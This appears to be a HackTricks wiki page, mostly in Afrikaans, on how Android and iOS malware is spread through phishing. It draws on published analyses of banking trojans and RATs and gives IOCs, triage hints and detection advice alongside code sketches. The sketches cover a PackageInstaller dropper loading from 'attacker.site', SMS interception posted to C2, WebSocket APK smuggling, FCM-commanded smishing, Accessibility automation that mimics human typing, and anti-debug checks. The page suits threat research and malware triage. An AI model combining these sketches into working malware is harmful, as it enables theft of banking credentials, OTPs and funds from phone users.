# Mobile Phishing & Malicious App Distribution (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Hierdie bladsy dek tegnieke wat deur threat actors gebruik word om **malicious Android APKs** en **iOS mobile-configuration profiles** te versprei deur phishing (SEO, social engineering, fake stores, dating apps, ens.).
> Die materiaal is aangepas uit die SarangTrap-veldtog wat deur Zimperium zLabs (2025) ontbloot is en ander openbare navorsing.

## Attack Flow

1. **SEO/Phishing Infrastructure**
* Registreer dosyne look-alike domains (dating, cloud share, car service…).
– Gebruik plaaslike taal sleutelwoorde en emojis in die `<title>` element om in Google te rangskik.
– Host *beide* Android (`.apk`) en iOS installasie-instruksies op dieselfde landing page.
2. **First Stage Download**
* Android: direkte skakel na 'n *unsigned* of “third-party store” APK.
* iOS: `itms-services://` of plain HTTPS skakel na 'n malicious **mobileconfig** profile (sien hieronder).
3. **Post-install Social Engineering**
* By eerste run vra die app vir 'n **invitation / verification code** (exclusive access illusion).
* Die code word oor HTTP na die Command-and-Control (C2) **POST**.
* C2 antwoord `{"success":true}` ➜ malware gaan voort.
* Sandbox / AV dynamic analysis wat nooit 'n geldige code indien nie, sien **no malicious behaviour** (evasion).
4. **Runtime Permission Abuse** (Android)
* Dangerous permissions word eers aangevra **ná** positiewe C2 response:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
<uses-permission android:name="android.permission.READ_PHONE_STATE"/>
<!-- Older builds also asked for SMS permissions -->
```
* Onlangse variante **verwyder `<uses-permission>` vir SMS uit `AndroidManifest.xml`** maar laat die Java/Kotlin code path wat SMS deur reflection lees, oor ⇒ verlaag static score terwyl dit steeds funksioneel is op toestelle wat die permission gee via `AppOps` abuse of ou targets.

5. **Android 13+ Restricted Settings & Dropper Bypass (SecuriDropper‑style)**
* Android 13 het **Restricted settings** vir sideloaded apps bekendgestel: Accessibility en Notification Listener toggles is grys totdat die user restricted settings uitdruklik in **App info** toelaat.
* Phishing pages en droppers stuur nou stap-vir-stap UI-instruksies om **restricted settings toe te laat** vir die sideloaded app en dan Accessibility/Notification access te aktiveer.
* 'n Nuwe bypass is om die payload via 'n **session-based PackageInstaller flow** te installeer (dieselfde metode wat app stores gebruik). Android behandel die app as store-installed, so Restricted settings blokkeer nie meer Accessibility nie.
* Triage hint: in 'n dropper, grep vir `PackageInstaller.createSession/openSession` plus code wat die victim onmiddellik na `ACTION_ACCESSIBILITY_SETTINGS` of `ACTION_NOTIFICATION_LISTENER_SETTINGS` neem.

6. **Facade UI & Background Collection**
* App wys harmless views (SMS viewer, gallery picker) wat plaaslik geïmplementeer is.
* Intussen exfiltrate dit:
- IMEI / IMSI, phone number
- Full `ContactsContract` dump (JSON array)
- JPEG/PNG van `/sdcard/DCIM` saamgepers met [Luban](https://github.com/Curzibn/Luban) om grootte te verminder
- Optional SMS content (`content://sms`)
Payloads word **batch-zipped** en gestuur via `HTTP POST /upload.php`.
7. **iOS Delivery Technique**
* 'n Enkele **mobile-configuration profile** kan `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` ens. aanvra om die device in “MDM”-agtige supervision te enroll.
* Social-engineering instruksies:
1. Open Settings ➜ *Profile downloaded*.
2. Tap *Install* drie keer (screenshots op die phishing page).
3. Trust die unsigned profile ➜ attacker kry *Contacts* & *Photo* entitlement sonder App Store review.
8. **iOS Web Clip Payload (phishing app icon)**
* `com.apple.webClip.managed` payloads kan **'n phishing URL op die Home Screen vaspen** met 'n branded icon/label.
* Web Clips kan **full-screen** loop (versteek die browser UI) en as **non-removable** gemerk word, wat die victim dwing om die profile te delete om die icon te verwyder.
9. **Network Layer**
* Plain HTTP, dikwels op poort 80 met HOST header soos `api.<phishingdomain>.com`.
* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (geen TLS → maklik om raak te sien).

## Red-Team Tips

* **Dynamic Analysis Bypass** – Tydens malware assessment, automate die invitation code fase met Frida/Objection om die malicious branch te bereik.
* **Manifest vs. Runtime Diff** – Vergelyk `aapt dump permissions` met runtime `PackageManager#getRequestedPermissions()`; missing dangerous perms is 'n rooi vlag.
* **Network Canary** – Konfigureer `iptables -p tcp --dport 80 -j NFQUEUE` om unsolid POST bursts ná code entry op te spoor.
* **mobileconfig Inspection** – Gebruik `security cms -D -i profile.mobileconfig` op macOS om `PayloadContent` te lys en excessive entitlements raak te sien.

## Useful Frida Snippet: Auto-Bypass Invitation Code

<details>
<summary>Frida: auto-bypass invitation code</summary>
```javascript
// frida -U -f com.badapp.android -l bypass.js --no-pause
// Hook HttpURLConnection write to always return success
Java.perform(function() {
var URL = Java.use('java.net.URL');
URL.openConnection.implementation = function() {
var conn = this.openConnection();
var HttpURLConnection = Java.use('java.net.HttpURLConnection');
if (Java.cast(conn, HttpURLConnection)) {
conn.getResponseCode.implementation = function(){ return 200; };
conn.getInputStream.implementation = function(){
return Java.use('java.io.ByteArrayInputStream').$new("{\"success\":true}".getBytes());
};
}
return conn;
};
});
```
</details>

## Aanwysers (Algemeen)
```
/req/checkCode.php        # invite code validation
/upload.php               # batched ZIP exfiltration
LubanCompress 1.1.8       # "Luban" string inside classes.dex
```
---

## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern

Hierdie patroon is waargeneem in veldtogte wat regeringsvoordeel-temas misbruik om Indiese UPI-geloofsbriewe en OTPs te steel. Operateurs keten betroubare platforms vir aflewering en veerkragtigheid.

### Delivery chain across trusted platforms
- YouTube video lokmiddel → beskrywing bevat ’n kort skakel
- Kortskakel → GitHub Pages phishing site wat die legit portal naboots
- Dieselfde GitHub repo huisves ’n APK met ’n vals “Google Play” kenteken wat direk na die lêer skakel
- Dinamiese phishing pages leef op Replit; remote command channel gebruik Firebase Cloud Messaging (FCM)

### Dropper with embedded payload and offline install
- Eerste APK is ’n installer (dropper) wat die regte malware by `assets/app.apk` saamstuur en die gebruiker aanspoor om Wi‑Fi/mobile data te deaktiveer om cloud detection te verswak.
- Die ingebedde payload installeer onder ’n onskuldige etiket (bv. “Secure Update”). Ná installasie is beide die installer en die payload teenwoordig as aparte apps.

Static triage tip (grep for embedded payloads):
```bash
unzip -l sample.apk | grep -i "assets/app.apk"
# Or:
zipgrep -i "classes|.apk" sample.apk | head
```
### Dinamiese eindpuntontdekking via shortlink
- Malware fetches a plain-text, comma-separated list van live endpoints from a shortlink; simple string transforms produce the final phishing page path.

Voorbeeld (gesuiwer):
```
GET https://rebrand.ly/dclinkto2
Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
Transform: "gate.html" → "gate.htm" (loaded in WebView)
UPI credential POST: https://sqcepo.replit.app/addup.php
SMS upload:           https://sqcepo.replit.app/addsm.php
```
Pseudo-kode:
```java
String csv = httpGet(shortlink);
String[] parts = csv.split(",");
String upiPage = parts[0].replace("gate.html", "gate.htm");
String smsPost = parts[1];
String credsPost = upiPage.replace("gate.htm", "addup.php");
```
### WebView-gebaseerde UPI-geloofsbriewe oes
- Die “Make payment of ₹1 / UPI‑Lite” stap laai ’n aanvaller se HTML-vorm vanaf die dinamiese eindpunt binne ’n WebView en vang sensitiewe velde (foon, bank, UPI PIN) wat na `addup.php` `POST` word.

Minimale laaier:
```java
WebView wv = findViewById(R.id.web);
wv.getSettings().setJavaScriptEnabled(true);
wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
```
### Self-propagation en SMS/OTP-onderskepping
- Agressiewe toestemmings word op eerste loop versoek:
```xml
<uses-permission android:name="android.permission.READ_CONTACTS"/>
<uses-permission android:name="android.permission.SEND_SMS"/>
<uses-permission android:name="android.permission.READ_SMS"/>
<uses-permission android:name="android.permission.CALL_PHONE"/>
```
- Kontakte word gelus om smishing-SMS vanaf die slagoffer se toestel in massa te stuur.
- Inkomende SMS word deur 'n broadcast receiver onderskep en saam met metadata (sender, body, SIM slot, per-device random ID) na `/addsm.php` opgelaai.

Receiver sketch:
```java
public void onReceive(Context c, Intent i){
SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
for (SmsMessage m: msgs){
postForm(urlAddSms, new FormBody.Builder()
.add("senderNum", m.getOriginatingAddress())
.add("Message", m.getMessageBody())
.add("Slot", String.valueOf(getSimSlot(i)))
.add("Device rand", getOrMakeDeviceRand(c))
.build());
}
}
```
### Firebase Cloud Messaging (FCM) as resilient C2
- Die payload registreer by FCM; push messages dra 'n `_type` veld wat as 'n skakelaar gebruik word om aksies te aktiveer (bv. dateer phishing-teks templates op, skakel gedrag om).

Example FCM payload:
```json
{
"to": "<device_fcm_token>",
"data": {
"_type": "update_texts",
"template": "New subsidy message..."
}
}
```
Handler-skets:
```java
@Override
public void onMessageReceived(RemoteMessage msg){
String t = msg.getData().get("_type");
switch (t){
case "update_texts": applyTemplate(msg.getData().get("template")); break;
case "smish": sendSmishToContacts(); break;
// ... more remote actions
}
}
```
### Indicators/IOCs
- APK bevat sekondêre payload by `assets/app.apk`
- WebView laai betaling vanaf `gate.htm` en exfiltreer na `/addup.php`
- SMS exfiltrasie na `/addsm.php`
- Shortlink-gedrewe config fetch (bv. `rebrand.ly/*`) wat CSV endpoints terugstuur
- Apps gemerk as generiese “Update/Secure Update”
- FCM `data` messages met 'n `_type` discriminator in ontrusted apps

---

## Socket.IO/WebSocket-based APK Smuggling + Fake Google Play Pages

Attackers vervang toenemend static APK links met 'n Socket.IO/WebSocket channel ingebed in Google Play-agtige lures. Dit verdoesel die payload URL, omseil URL/extension filters, en behou 'n realistiese install UX.

Tipiese client flow in die wild waargeneem:

<details>
<summary>Socket.IO fake Play downloader (JavaScript)</summary>
```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
const url = URL.createObjectURL(blob);
const a = document.createElement("a");
a.href = url; a.download = "app.apk"; a.style.display = "none";
document.body.appendChild(a); a.click();
});
```
</details>

Hoekom dit eenvoudige kontroles ontduik:
- Geen statiese APK-URL word blootgestel nie; die payload word in geheue herbou vanaf WebSocket-frames.
- URL/MIME/uitbreiding-filters wat direkte .apk-responses blokkeer, kan binêre data wat via WebSockets/Socket.IO getunnel word, miskyk.
- Crawlers en URL-sandboxes wat nie WebSockets uitvoer nie, sal nie die payload herwin nie.

Sien ook WebSocket tradecraft en tooling:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## Android Accessibility/Overlay & Device Admin Abuse, ATS automation, and NFC relay orchestration – RatOn case study

Die RatOn banker/RAT-veldtog (ThreatFabric) is 'n konkrete voorbeeld van hoe moderne mobile phishing-operasies WebView-droppers, Accessibility-gedrewe UI-automatisering, overlays/ransom, Device Admin-dwang, Automated Transfer System (ATS), crypto wallet takeover, en selfs NFC-relay-orchestrering kombineer. Hierdie afdeling abstraheer die herbruikbare tegnieke.

### Stage-1: WebView → native install bridge (dropper)
Aanvallers bied 'n WebView aan wat na 'n aanvallerbladsy wys en spuit 'n JavaScript-interface in wat 'n native installer blootstel. 'n Tik op 'n HTML-knoppie roep native kode aan wat 'n tweede-fase APK installeer wat in die dropper se assets saamgebundel is en begin dit dan direk.

Minimal pattern:

<details>
<summary>Stage-1 dropper minimal pattern (Java)</summary>
```java
public class DropperActivity extends Activity {
@Override protected void onCreate(Bundle b){
super.onCreate(b);
WebView wv = new WebView(this);
wv.getSettings().setJavaScriptEnabled(true);
wv.addJavascriptInterface(new Object(){
@android.webkit.JavascriptInterface
public void installApk(){
try {
PackageInstaller pi = getPackageManager().getPackageInstaller();
PackageInstaller.SessionParams p = new PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL);
int id = pi.createSession(p);
try (PackageInstaller.Session s = pi.openSession(id);
InputStream in = getAssets().open("payload.apk");
OutputStream out = s.openWrite("base.apk", 0, -1)){
byte[] buf = new byte[8192]; int r; while((r=in.read(buf))>0){ out.write(buf,0,r);} s.fsync(out);
}
PendingIntent status = PendingIntent.getBroadcast(this, 0, new Intent("com.evil.INSTALL_DONE"), PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
pi.commit(id, status.getIntentSender());
} catch (Exception e) { /* log */ }
}
}, "bridge");
setContentView(wv);
wv.loadUrl("https://attacker.site/install.html");
}
}
```
</details>

HTML op die bladsy:
```html
<button onclick="bridge.installApk()">Install</button>
```
Na installasie, begin die dropper die payload via eksplisiete package/activity:
```java
Intent i = new Intent();
i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
startActivity(i);
```
Hunting idea: onbetroubare apps wat `addJavascriptInterface()` aanroep en installer-agtige metodes aan WebView blootstel; APK wat 'n ingebedde sekondêre payload onder `assets/` saamlewer en die Package Installer Session API aanroep.

### Toestemmingsfunnel: Accessibility + Device Admin + opvolg-runtime-promptes
Stage-2 open 'n WebView wat 'n “Access” bladsy huisves. Die knoppie roep 'n geëxporteerde metode aan wat die slagoffer na die Accessibility-instellings navigeer en versoek dat die rogue service geaktiveer word. Sodra dit toegestaan is, gebruik malware Accessibility om latere runtime-toestemmingsdialoë outomaties deur te klik (kontakte, overlay, manage system settings, ens.) en versoek Device Admin.

- Accessibility help programmaties om later promptes te aanvaar deur knoppies soos “Allow”/“OK” in die node-tree te vind en kliks te stuur.
- Overlay permission check/request:
```java
if (!Settings.canDrawOverlays(ctx)) {
Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
Uri.parse("package:" + ctx.getPackageName()));
ctx.startActivity(i);
}
```
See also:

{{#ref}}
../../mobile-pentesting/android-app-pentesting/accessibility-services-abuse.md
{{#endref}}

### Overlay phishing/ransom via WebView
Operateurs kan opdragte gee om:
- ’n volskerm-oorleg vanaf ’n URL te render, of
- inline HTML deur te gee wat in ’n WebView-oorleg gelaai word.

Waarskynlike gebruike: dwang (PIN-invoer), wallet-opening om PINs vas te vang, ransom-boodskappe. Hou ’n opdrag om te verseker dat oorlegtoestemming toegestaan word as dit ontbreek.

### Remote control model – text pseudo-screen + screen-cast
- Lae-bandwydte: dump periodiek die Accessibility node tree, serialiseer sigbare tekste/rolle/grense en stuur dit na C2 as ’n pseudo-screen (opdragte soos `txt_screen` eenmalig en `screen_live` deurlopend).
- Hoë-getrouheid: versoek MediaProjection en begin screen-casting/recording op aanvraag (opdragte soos `display` / `record`).

### ATS playbook (bank app automation)
Gegee ’n JSON taak, open die bank-app, dryf die UI via Accessibility met ’n mengsel van teksnavrae en koördinaat-taps, en voer die slagoffer se betalings-PIN in wanneer gevra.

Voorbeeldtaak:
```json
{
"cmd": "transfer",
"receiver_address": "ACME s.r.o.",
"account": "123456789/0100",
"amount": "24500.00",
"name": "ACME"
}
```
Voorbeeldtekste wat in een teikenvloei gesien word (CZ → EN):
- "Nová platba" → "New payment"
- "Zadat platbu" → "Enter payment"
- "Nový příjemce" → "New recipient"
- "Domácí číslo účtu" → "Domestic account number"
- "Další" → "Next"
- "Odeslat" → "Send"
- "Ano, pokračovat" → "Yes, continue"
- "Zaplatit" → "Pay"
- "Hotovo" → "Done"

Operateurs kan ook oordraglimiete via opdragte soos `check_limit` en `limit` nagaan/verhoog wat die limits UI op soortgelyke wyse navigeer.

### Crypto wallet seed extraction
Teikens soos MetaMask, Trust Wallet, Blockchain.com, Phantom. Vloei: ontsluit (gesteelde PIN of verskafde wagwoord), navigeer na Security/Recovery, openbaar/wys seed phrase, keylog/exfiltrate dit. Implementeer locale-aware selectors (EN/RU/CZ/SK) om navigasie oor tale heen te stabiliseer.

### Device Admin coercion
Device Admin APIs word gebruik om PIN-capture-geleenthede te verhoog en die slagoffer te frustreer:

- Immediate lock:
```java
dpm.lockNow();
```
- Laat huidige credential verval om verandering af te dwing (Accessibility vang nuwe PIN/wagwoord):
```java
dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
```
- Dwing nie-biometriese ontsluiting af deur keyguard biometriese kenmerke te deaktiveer:
```java
dpm.setKeyguardDisabledFeatures(admin,
DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
```
Nota: Baie DevicePolicyManager-kontroles vereis Device Owner/Profile Owner op onlangse Android; sommige OEM-builds kan laks wees. Valideer altyd op die teiken OS/OEM.

### NFC relay orchestration (NFSkate)
Stage-3 kan ’n eksterne NFC-relay module (bv. NFSkate) installeer en begin, en selfs vir dit ’n HTML-sjabloon gee om die slagoffer tydens die relay te lei. Dit maak kontaklose card-present cash-out moontlik saam met online ATS.

Agtergrond: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).

### Operator command set (sample)
- UI/state: `txt_screen`, `screen_live`, `display`, `record`
- Sosiaal: `send_push`, `Facebook`, `WhatsApp`
- Overlays: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
- Wallets: `metamask`, `trust`, `blockchain`, `phantom`
- ATS: `transfer`, `check_limit`, `limit`
- Device: `lock`, `expire_password`, `disable_keyguard`, `home`, `back`, `recents`, `power`, `touch`, `swipe`, `keypad`, `tint`, `sound_mode`, `set_sound`
- Comms/Recon: `update_device`, `send_sms`, `replace_buffer`, `get_name`, `add_contact`
- NFC: `nfs`, `nfs_inject`

### Accessibility-driven ATS anti-detection: human-like text cadence and dual text injection (Herodotus)

Threat actors meng toenemend Accessibility-driven automation met anti-detection wat teen basiese gedrag-biometrie ingestel is. ’n Onlangse banker/RAT toon twee komplementêre teksafleweringsmodusse en ’n operator-skakelaar om menslike tikwerk met ewekansige cadence te simuleer.

- Discovery mode: lys sigbare nodes met selectors en bounds om invoervelde presies te teiken (ID, text, contentDescription, hint, bounds) voordat daar opgetree word.
- Dual text injection:
- Mode 1 – `ACTION_SET_TEXT` direk op die teikennode (stabiel, geen keyboard);
- Mode 2 – clipboard set + `ACTION_PASTE` in die gefokusde node (werk wanneer direkte setText geblokkeer word).
- Human-like cadence: split die deur die operator verskafde string op en lewer dit karakter-vir-karakter af met ewekansige 300–3000 ms vertragings tussen events om “machine-speed typing” heuristieke te ontduik. Geïmplementeer óf deur die waarde progressief te vergroot via `ACTION_SET_TEXT`, óf deur een karakter op ’n slag te paste.

<details>
<summary>Java sketch: node discovery + delayed per-char input via setText or clipboard+paste</summary>
```java
// Enumerate nodes (HVNCA11Y-like): text, id, desc, hint, bounds
void discover(AccessibilityNodeInfo r, List<String> out){
if (r==null) return; Rect b=new Rect(); r.getBoundsInScreen(b);
CharSequence id=r.getViewIdResourceName(), txt=r.getText(), cd=r.getContentDescription();
out.add(String.format("cls=%s id=%s txt=%s desc=%s b=%s",
r.getClassName(), id, txt, cd, b.toShortString()));
for(int i=0;i<r.getChildCount();i++) discover(r.getChild(i), out);
}

// Mode 1: progressively set text with randomized 300–3000 ms delays
void sendTextSetText(AccessibilityNodeInfo field, String s) throws InterruptedException{
String cur = "";
for (char c: s.toCharArray()){
cur += c; Bundle b=new Bundle();
b.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, cur);
field.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, b);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}

// Mode 2: clipboard + paste per-char with randomized delays
void sendTextPaste(AccessibilityService svc, AccessibilityNodeInfo field, String s) throws InterruptedException{
field.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
ClipboardManager cm=(ClipboardManager) svc.getSystemService(Context.CLIPBOARD_SERVICE);
for (char c: s.toCharArray()){
cm.setPrimaryClip(ClipData.newPlainText("x", Character.toString(c)));
field.performAction(AccessibilityNodeInfo.ACTION_PASTE);
Thread.sleep(300 + new java.util.Random().nextInt(2701));
}
}
```
</details>

Blokkeer oorlegsels vir bedrogdekking:
- Render 'n volskerm `TYPE_ACCESSIBILITY_OVERLAY` met operateur-beheerde ondeursigtigheid; hou dit ondeursigtig vir die slagoffer terwyl afgeleë outomatisering daaronder voortgaan.
- Opdragte wat tipies blootgestel word: `opacityOverlay <0..255>`, `sendOverlayLoading <html/url>`, `removeOverlay`.

Minimum oorlegsel met verstelbare alpha:
```java
View v = makeOverlayView(ctx); v.setAlpha(0.92f); // 0..1
WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
MATCH_PARENT, MATCH_PARENT,
WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
PixelFormat.TRANSLUCENT);
wm.addView(v, lp);
```
Operator control primitives often seen: `BACK`, `HOME`, `RECENTS`, `CLICKTXT`/`CLICKDESC`/`CLICKELEMENT`/`CLICKHINT`, `TAP`/`SWIPE`, `NOTIFICATIONS`, `OPNPKG`, `VNC`/`VNCA11Y` (screen sharing).

## Multi-stage Android dropper with WebView bridge, JNI string decoder, and staged DEX loading

CERT Polska se 03 April 2026-ontleding van **cifrat** is ’n goeie verwysing vir ’n moderne phishing-gelewerde Android loader waar die sigbare APK slegs ’n installer shell is. Die herbruikbare tradecraft is nie die familienaam nie, maar die manier waarop die stadiums gekoppel word:

1. Phishing page lewer ’n lure APK.
2. Stage 0 versoek `REQUEST_INSTALL_PACKAGES`, laai ’n native `.so`, decrypt ’n ingebedde blob, en installeer stage 2 met **PackageInstaller sessions**.
3. Stage 2 decrypt nog ’n verborge asset, behandel dit as ’n ZIP, en **dynamically loads DEX** vir die finale RAT.
4. Final stage misbruik Accessibility/MediaProjection en gebruik WebSockets vir control/data.

### WebView JavaScript bridge as the installer controller

In plaas daarvan om WebView net vir fake branding te gebruik, kan die lure ’n bridge blootstel wat ’n local/remote page toelaat om die device te fingerprint en native install logic te trigger:
```java
webView.addJavascriptInterface(controller, "Android");
webView.loadUrl("file:///android_asset/bootstrap.html");

@JavascriptInterface
public String get_SYSINFO() { /* SDK, model, manufacturer, locale */ }

@JavascriptInterface
public void start() { mainHandler.post(this::installStage2); }
```
Triage-idees:
- grep vir `addJavascriptInterface`, `@JavascriptInterface`, `loadUrl("file:///android_asset/` en remote phishing URLs wat in dieselfde activity gebruik word
- kyk vir bridges wat installer-agtige methods blootstel (`start`, `install`, `openAccessibility`, `requestOverlay`)
- as die bridge deur ’n phishing page ondersteun word, behandel dit as ’n operator/controller surface, nie net UI nie

### Native string decoding geregistreer in `JNI_OnLoad`

Een nuttige patroon is `n Java method wat onskuldig lyk maar eintlik deur `RegisterNatives` tydens `JNI_OnLoad` ondersteun word. In cifrat het die decoder die eerste char geïgnoreer, die tweede as `n 1-byte XOR key gebruik, die res hex-decoded, en elke byte getransformeer as `((b - i) & 0xff) ^ key`.

Minimal offline reproduction:
```python
def decode_native(s: str) -> str:
key = ord(s[1]); raw = bytes.fromhex(s[2:])
return bytes((((b - i) & 0xFF) ^ key) for i, b in enumerate(raw)).decode()
```
Gebruik dit wanneer jy sien:
- herhaalde aanroepe na een native-backed Java method vir URLs, package names, of keys
- `JNI_OnLoad` wat classes resolve en `RegisterNatives` aanroep
- geen betekenisvolle plaintext strings in DEX nie, maar baie kort hex-agtige constants wat na een helper deurgegee word

### Layered payload staging: XOR resource -> installed APK -> RC4-like asset -> ZIP -> DEX

Hierdie familie het twee unpacking layers gebruik wat generies die moeite werd is om na te soek:

- **Stage 0**: decrypt `res/raw/*.bin` met ’n XOR key wat deur die native decoder afgelei word, en installeer dan die plaintext APK deur `PackageInstaller.createSession` -> `openWrite` -> `fsync` -> `commit`
- **Stage 2**: extraheer ’n onskuldige asset soos `FH.svg`, decrypt dit met ’n RC4-like routine, parse die result as ’n ZIP, en laai dan hidden DEX files

Dit is ’n sterk aanduiding van ’n werklike dropper/loader pipeline omdat elke layer die volgende stage opaque hou vir basiese static scanning.

Quick triage checklist:
- `REQUEST_INSTALL_PACKAGES` plus `PackageInstaller` session calls
- receivers vir `PACKAGE_ADDED` / `PACKAGE_REPLACED` om die chain voort te sit ná install
- encrypted blobs onder `res/raw/` of `assets/` met nie-media extensions
- `DexClassLoader` / `InMemoryDexClassLoader` / ZIP handling naby custom decryptors

### Native anti-debugging through `/proc/self/maps`

Die native bootstrap het ook `/proc/self/maps` vir `libjdwp.so` geskandeer en geaborteer as dit teenwoordig was. Dit is ’n praktiese vroeë anti-analysis check omdat JDWP-backed debugging ’n herkenbare gemapte library laat:
```c
FILE *f = fopen("/proc/self/maps", "r");
while (fgets(line, sizeof(line), f)) {
if (strstr(line, "libjdwp.so")) return -1;
}
```
Jagingsidees:
- grep native code / decompiler output vir `/proc/self/maps`, `libjdwp.so`, `frida`, `qemu`, `goldfish`, `ranchu`
- as Frida hooks te laat arriveer, inspekteer eers `.init_array` en `JNI_OnLoad`
- behandel anti-debug + string decoder + staged install as een cluster, nie onafhanklike findings nie

## References

- [New Android Malware Herodotus Mimics Human Behaviour to Evade Detection](https://www.threatfabric.com/blogs/new-android-malware-herodotus-mimics-human-behaviour-to-evade-detection)

- [The Dark Side of Romance: SarangTrap Extortion Campaign](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [Luban – Android image compression library](https://github.com/Curzibn/Luban)
- [Android Malware Promises Energy Subsidy to Steal Financial Data (McAfee Labs)](https://www.mcafee.com/blogs/other-blogs/mcafee-labs/android-malware-promises-energy-subsidy-to-steal-financial-data/)
- [Firebase Cloud Messaging — Docs](https://firebase.google.com/docs/cloud-messaging)
- [The Rise of RatOn: From NFC heists to remote control and ATS (ThreatFabric)](https://www.threatfabric.com/blogs/the-rise-of-raton-from-nfc-heists-to-remote-control-and-ats)
- [GhostTap/NFSkate – NFC relay cash-out tactic (ThreatFabric)](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay)
- [Banker Trojan Targeting Indonesian and Vietnamese Android Users (DomainTools)](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
- [DomainTools SecuritySnacks – ID/VN Banker Trojans (IOCs)](https://github.com/DomainTools/SecuritySnacks/blob/main/2025/BankerTrojan-ID-VN)
- [Socket.IO](https://socket.io)
- [Bypassing Android 13 Restrictions with SecuriDropper (ThreatFabric)](https://www.threatfabric.com/blogs/droppers-bypassing-android-13-restrictions)
- [Analysis of cifrat: could this be an evolution of a mobile RAT?](https://cert.pl/en/posts/2026/04/cifrat-analysis/)
- [Web Clips payload settings for Apple devices](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)

{{#include ../../banners/hacktricks-training.md}}
